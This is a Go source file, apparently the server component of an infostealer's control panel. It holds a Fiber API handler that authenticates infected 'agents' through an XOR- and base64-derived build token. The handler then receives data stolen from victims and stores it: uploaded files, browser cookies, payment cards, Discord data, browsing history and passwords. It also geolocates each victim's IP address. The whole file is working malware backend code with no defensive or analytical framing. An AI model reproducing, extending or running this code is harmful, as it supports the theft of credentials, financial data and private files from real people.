package api

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"path"
	"server/global"
	"server/lib"
	"strings"

	"github.com/gofiber/fiber/v2"
)

func JSONParse(iface interface{}, c *fiber.Ctx) error {
  return json.Unmarshal(c.BodyRaw(), iface)
}

func Data(c *fiber.Ctx) error {
  cookie := c.Get("Authorization")
  id := strings.Clone(c.Query("id"))
  typ := strings.Clone(c.Query("type"))

  if cookie == "" || id == "" || typ == "" {
    return lib.APIError(c, 400)
  }

  dec, err := base64.StdEncoding.DecodeString(lib.Reverse([]byte(cookie)))
  if err != nil {
    log.Print("Cannot decode cookie")
    return lib.APIError(c, 400)
  }

  if len(dec) != len(id) {
    return lib.APIError(c, 400)
  }

  token, err := lib.XOR(string(dec), id)
  if err != nil {
    log.Print("Cannot XOR cookie and ID")
    return lib.APIError(c, 500)
  }

  var build *global.TBuild = nil 
  for _, b := range global.Builds {
    if b.Token == token && b.Enabled {
      build = &b
      break
    }
  }

  if build == nil {
    return lib.APIError(c, 403)
  }

  var agent *global.TAgent = &global.TAgent{
    ID: "0",
  }

  for i := range global.Agents {
    if global.Agents[i].ID == id {
      agent = &global.Agents[i]
    }
  }

  var tmp global.TAgent
  if typ == "files" {
    file := global.TFile{} 
    err := c.BodyParser(&file)
    if err != nil {
      log.Printf("Cannot parse passwords: %s", err.Error())
      return lib.APIError(c, 500)
    }

    for _, f := range agent.Files {
      if f.Path == file.Path {
        goto END
      }
    }

    err = os.Mkdir(path.Join("db", "files"), os.ModePerm)
    if err != nil && !os.IsExist(err) {
      log.Printf("Cannot create files directory")
      return lib.APIError(c, 500)
    }

    filename := lib.MakeRandom(12)
    exts := strings.Split(file.Path, ".")
    if len(exts) >= 2 && lib.LFISafe(exts[1]){
      filename += "."+exts[1]
    }

    plain, err := base64.StdEncoding.DecodeString(file.Data)
    if err != nil {
      log.Printf("Not uploading bad encoded file")
      return lib.APIError(c, 400)
    }

    err = os.WriteFile(path.Join("db", "files", filename), plain, os.ModePerm)
    if err != nil {
      log.Printf("Cannot save upload")
      return lib.APIError(c, 500)
    }

    file.Size = int64(len(file.Data))
    file.Data = filename
    agent.Files = append(agent.Files, file)
    goto END 
  }

  err = c.BodyParser(&tmp)
  if err != nil {
    log.Printf("Cannot parse agent: %s", err.Error())
    return lib.APIError(c, 500)
  }

  switch typ {
  case "system":
    agent.Sysinfo = tmp.Sysinfo
    agent.Sysinfo.PublicIP = lib.GetIP(c)
    res, err := http.Get("https://ipapi.co/"+agent.Sysinfo.PublicIP+"/json")
    if err != nil {
      log.Printf("Cannot connect to IP API: %s", err.Error())
      goto END
    }
    defer res.Body.Close()

    st := struct{
      ISP      string `json:"org"`
      Error    bool   `json:"error"`
      Reason   string `json:"reason"`
      Country  string `json:"country_code"`
      Timezone string `json:"timezone"`
    }{}

    body, err := io.ReadAll(res.Body)
    if err != nil {
      log.Printf("Failed to read IP API body: %s", err.Error())
      goto END
    }

    err = json.Unmarshal(body, &st)
    if err != nil {
      log.Printf("Failed to unmarshal IP API body: %s", err.Error())
      goto END
    }

    if st.Error {
      log.Printf("IP API returned an error: %s", st.Reason)
      goto END
    }

    agent.Sysinfo.ISP = st.ISP
    agent.Sysinfo.Country = strings.ToLower(st.Country) 
    agent.Sysinfo.Timezone = st.Timezone

  case "cookie":
    agent.Cookie = tmp.Cookie

  case "card":
    agent.Card = tmp.Card

  case "discord":
    agent.Discord = tmp.Discord

  case "history":
    agent.History = tmp.History

  case "password":
    agent.Password = tmp.Password

  default:
    log.Printf("Unknown type API request: %s", typ)
    return lib.APIError(c, 404)

  }

END:
  if agent.ID == "0" {
    agent.ID = id
    agent.Token = token
    global.Agents = append(global.Agents, *agent)
    log.Printf("Added new agent: %s", id)
  }

  lib.SaveDB("agents", global.Agents)
  return lib.APIReturn(c, fiber.Map{})
}
